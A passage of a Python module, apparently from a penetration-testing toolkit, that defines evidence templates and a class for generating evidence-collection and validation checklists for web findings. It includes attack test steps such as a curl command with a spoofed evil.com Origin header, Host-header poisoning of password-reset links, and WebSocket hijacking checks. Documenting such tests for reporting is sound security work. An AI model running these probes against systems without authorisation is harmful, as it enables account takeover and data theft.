            {"action": "Try null origin: Origin: null", "expected": "null origin accepted", "if_fails": "null handling may be safe"},
            {"action": "Create PoC to fetch sensitive API", "expected": "Can read cross-origin response", "if_fails": "CORS may be correctly configured"},
            {"action": "Verify cookies sent with cross-origin request", "expected": "Session cookie included", "if_fails": "SameSite may block"},
        ],
        "quick_verify": "curl -H 'Origin: https://evil.com' https://target.com/api/user - check ACAO header",
        "quick_verify_expected": "Response contains Access-Control-Allow-Origin: https://evil.com with Allow-Credentials: true",
        "false_positive_indicators": [
            "ACAO is * but no credentials allowed",
            "Origin not reflected (static whitelist)",
            "No sensitive data in API response",
            "SameSite cookies prevent credential sending",
        ],
        "true_positive_indicators": [
            "Arbitrary origin reflected with credentials",
            "Can read authenticated API responses cross-origin",
            "null origin accepted with credentials",
            "Sensitive data accessible from any origin",
        ],
    },

    "websocket_vulnerability": {
        "evidence": [
            {
                "type": EvidenceType.NETWORK_CAPTURE,
                "description": "WebSocket connection and messages",
                "capture_method": "Capture WebSocket upgrade and messages",
                "expected_content": "WS handshake and vulnerable message exchange",
                "filename": "{finding_id}_websocket_capture.txt",
                "priority": "Required",
                "tools": ["Burp Suite", "Browser DevTools"],
            },
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "WebSocket upgrade request",
                "capture_method": "Save the initial WebSocket handshake",
                "expected_content": "Upgrade: websocket header and key",
                "filename": "{finding_id}_ws_handshake.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Exploitation via WebSocket",
                "capture_method": "Screenshot showing attack success",
                "expected_content": "Hijacked messages, injected commands, etc.",
                "filename": "{finding_id}_ws_exploit.png",
                "priority": "Required",
                "tools": ["Browser DevTools", "Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Connect to WebSocket from different origin", "expected": "Connection accepted (CSWSH)", "if_fails": "Origin validation present"},
            {"action": "Inject malicious message", "expected": "Server processes without validation", "if_fails": "Input validated"},
            {"action": "Test for XSS via WebSocket", "expected": "Script executes in other clients", "if_fails": "Output encoded"},
            {"action": "Check authentication on WS messages", "expected": "Can send messages without auth", "if_fails": "Proper auth required"},
        ],
        "quick_verify": "Use Browser DevTools Network tab to inspect WS messages, try sending modified messages",
        "quick_verify_expected": "Can inject arbitrary messages or connect from unauthorized origin",
        "false_positive_indicators": [
            "Origin header validated",
            "Authentication required for WS",
            "Messages properly validated",
        ],
        "true_positive_indicators": [
            "Cross-site WebSocket hijacking possible",
            "Can inject messages to other users",
            "No authentication on sensitive actions",
            "XSS via WebSocket messages",
        ],
    },

    "host_header_injection": {
        "evidence": [
            {
                "type": EvidenceType.HTTP_REQUEST,
                "description": "Request with malicious Host header",
                "capture_method": "Save request with modified Host header",
                "expected_content": "Host: evil.com or X-Forwarded-Host injection",
                "filename": "{finding_id}_request.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.HTTP_RESPONSE,
                "description": "Response reflecting malicious host",
                "capture_method": "Save response where host is reflected",
                "expected_content": "Password reset link, redirect, or content with evil host",
                "filename": "{finding_id}_response.txt",
                "priority": "Required",
                "tools": ["Burp Suite"],
            },
            {
                "type": EvidenceType.SCREENSHOT,
                "description": "Email or page with injected host",
                "capture_method": "Screenshot showing attacker's host in URL",
                "expected_content": "Password reset email with evil.com link",
                "filename": "{finding_id}_injection_proof.png",
                "priority": "If applicable",
                "tools": ["Email client", "Screenshot tool"],
            },
        ],
        "validation": [
            {"action": "Change Host header to evil.com", "expected": "Server responds normally", "if_fails": "Virtual host validation"},
            {"action": "Trigger password reset with evil Host", "expected": "Reset link contains attacker's host", "if_fails": "Host not used in links"},
            {"action": "Try X-Forwarded-Host header", "expected": "Header used for link generation", "if_fails": "Header ignored"},
            {"action": "Check web cache for poisoning", "expected": "Cache stores response with evil host", "if_fails": "Cache not poisonable"},
        ],
        "quick_verify": "Send password reset with Host: evil.com, check if reset link uses evil.com",
        "quick_verify_expected": "Password reset email contains link to evil.com",
        "false_positive_indicators": [
            "Host header validated against whitelist",
            "Absolute URLs used (not relative to Host)",
            "Host reflected but not in sensitive context",
        ],
        "true_positive_indicators": [
            "Password reset links use injected host",
            "Can poison web cache",
            "SSRF via Host header",
            "Redirect to attacker's host",
        ],
    },
}


class EvidenceFramework:
    """
    Generates evidence collection guidance for security findings.
    """

    def __init__(self):
        self.templates = EVIDENCE_TEMPLATES

    def generate_evidence_guide(
        self,
        finding: Dict[str, Any],
    ) -> FindingEvidenceGuide:
        """
        Generate evidence collection guide for a single finding.
        """
        finding_id = finding.get("id", f"finding_{hash(str(finding)) % 10000}")
        finding_title = finding.get("title", finding.get("name", "Unknown Finding"))
        finding_type = self._classify_finding_type(finding)
        severity = finding.get("severity", "Medium")

        # Get template for this finding type
        template = self.templates.get(finding_type, {})

        # Build evidence requirements
        evidence_reqs = []
        for ev in template.get("evidence", []):
            evidence_reqs.append(EvidenceRequirement(
                evidence_type=ev["type"],
                description=ev["description"],
                capture_method=ev["capture_method"],
                expected_content=ev["expected_content"],
                filename_suggestion=ev["filename"].format(finding_id=finding_id),
                priority=ev.get("priority", "Required"),
                tools_needed=ev.get("tools", []),
            ))

        # Build validation steps
        validation_steps = []
        for i, val in enumerate(template.get("validation", []), 1):
            validation_steps.append(ValidationStep(
                step_number=i,
                action=val["action"],
                expected_result=val["expected"],
                if_fails=val["if_fails"],
            ))

        # Build proof of exploitation if available
        poe_data = template.get("proof_of_exploitation")
        poe = None
        if poe_data:
            tool_verifications = []
            for tv in poe_data.get("tool_verifications", []):
                tool_verifications.append(ToolVerification(
                    tool=tv["tool"],
                    command_template=tv["command"],
                    expected_output=tv["expected"],
                    notes=tv.get("notes", ""),
                ))
            poe = ProofOfExploitation(
                minimum_evidence=poe_data.get("minimum_evidence", []),
                definitive_proof=poe_data.get("definitive_proof", []),
                misleading_outputs=poe_data.get("misleading_outputs", []),
                differentiation_tips=poe_data.get("differentiation_tips", []),
                tool_verifications=tool_verifications,
                do_not_report_as_exploited=poe_data.get("do_not_report_as_exploited", []),
                impact_proof_requirements=poe_data.get("impact_proof_requirements", []),
            )

        # Build the guide
        guide = FindingEvidenceGuide(
            finding_id=finding_id,
            finding_title=finding_title,
            finding_type=finding_type,
            severity=severity,
            evidence_requirements=evidence_reqs,
            validation_steps=validation_steps,
            quick_verify_command=template.get("quick_verify"),
            quick_verify_expected=template.get("quick_verify_expected"),
            false_positive_indicators=template.get("false_positive_indicators", []),
            true_positive_indicators=template.get("true_positive_indicators", []),
            evidence_folder=f"evidence/{finding_type}/{finding_id}/",
            proof_of_exploitation=poe,
        )

        return guide

    def generate_evidence_guides_batch(
        self,
        findings: List[Dict[str, Any]],
    ) -> List[Dict[str, Any]]:
        """
        Generate evidence collection guides for multiple findings.
        """
        guides = []
        for finding in findings:
            guide = self.generate_evidence_guide(finding)
            guides.append(guide.to_dict())
        return guides

    def _classify_finding_type(self, finding: Dict[str, Any]) -> str:
        """
        Classify finding into a known type for template matching.
        """
        title = finding.get("title", "").lower()
        desc = finding.get("description", "").lower()
        vuln_type = finding.get("type", "").lower()
        combined = f"{title} {desc} {vuln_type}"

        # Classification rules - ordered by specificity (more specific patterns first)
        if any(x in combined for x in ["sql injection", "sqli", "sql-injection"]):
            return "sql_injection"
        elif any(x in combined for x in ["nosql injection", "nosql-injection", "mongodb injection", "mongo injection"]):
            return "nosql_injection"
        elif any(x in combined for x in ["ldap injection", "ldap-injection", "ldap filter"]):
            return "ldap_injection"
        elif any(x in combined for x in ["xss", "cross-site scripting", "cross site scripting"]):
            return "xss"
        elif any(x in combined for x in ["xxe", "xml external entity", "xml entity injection"]):
            return "xxe"
        elif any(x in combined for x in ["csrf", "cross-site request forgery", "cross site request forgery", "xsrf"]):
            return "csrf"
        elif any(x in combined for x in ["ssrf", "server-side request", "server side request"]):
            return "ssrf"
        elif any(x in combined for x in ["idor", "insecure direct object", "broken object level"]):
            return "idor"
        elif any(x in combined for x in ["auth bypass", "authentication bypass", "broken authentication"]):
            return "authentication_bypass"
        elif any(x in combined for x in ["rce", "remote code", "command injection", "os command"]):
            return "rce"
        elif any(x in combined for x in ["path traversal", "directory traversal", "lfi", "local file"]):
            return "path_traversal"
        elif any(x in combined for x in ["deserialization", "deserialize", "insecure unserialize", "pickle", "java serialize"]):
            return "deserialization"
        elif any(x in combined for x in ["file upload", "unrestricted upload", "malicious file", "upload vuln"]):
            return "file_upload"
        elif any(x in combined for x in ["open redirect", "url redirect", "unvalidated redirect"]):
            return "open_redirect"
        elif any(x in combined for x in ["jwt", "json web token", "token tampering", "jwt weak"]):
            return "jwt_vulnerability"
        elif any(x in combined for x in ["race condition", "race-condition", "toctou", "time of check"]):
            return "race_condition"
        elif any(x in combined for x in ["cors", "cross-origin resource", "access-control-allow"]):
            return "cors_misconfiguration"
        elif any(x in combined for x in ["websocket", "ws://", "wss://", "socket hijack"]):
            return "websocket_vulnerability"
        elif any(x in combined for x in ["host header", "host-header", "host injection", "x-forwarded-host"]):
            return "host_header_injection"
        elif any(x in combined for x in ["sensitive data", "information disclosure", "data exposure", "credentials"]):
            return "sensitive_data_exposure"
        else:
            return "generic"

    def get_evidence_checklist_markdown(
        self,
        guide: FindingEvidenceGuide,
    ) -> str:
        """
        Generate a markdown checklist for evidence collection.
        """
        md = f"""## Evidence Checklist: {guide.finding_title}

**Finding ID:** {guide.finding_id}
**Type:** {guide.finding_type}
**Severity:** {guide.severity}
**Evidence Folder:** `{guide.evidence_folder}`

### Required Evidence

"""
        for ev in guide.evidence_requirements:
            priority_marker = "**[REQUIRED]**" if ev.priority == "Required" else f"[{ev.priority}]"
            md += f"""- [ ] {priority_marker} {ev.description}
  - **How:** {ev.capture_method}
  - **Expected:** {ev.expected_content}
  - **Save as:** `{ev.filename_suggestion}`
  - **Tools:** {', '.join(ev.tools_needed) if ev.tools_needed else 'Manual'}

"""

        md += """### Validation Steps

"""
        for step in guide.validation_steps:
            md += f"""- [ ] **Step {step.step_number}:** {step.action}
  - Expected: {step.expected_result}
  - If fails: {step.if_fails}

"""

        if guide.quick_verify_command:
            md += f"""### Quick Verification

```bash
{guide.quick_verify_command}
```

**Expected result:** {guide.quick_verify_expected}

"""

        md += """### True Positive Indicators

"""
        for indicator in guide.true_positive_indicators:
            md += f"- {indicator}\n"

        md += """
### False Positive Indicators

"""
        for indicator in guide.false_positive_indicators:
            md += f"- {indicator}\n"

        return md
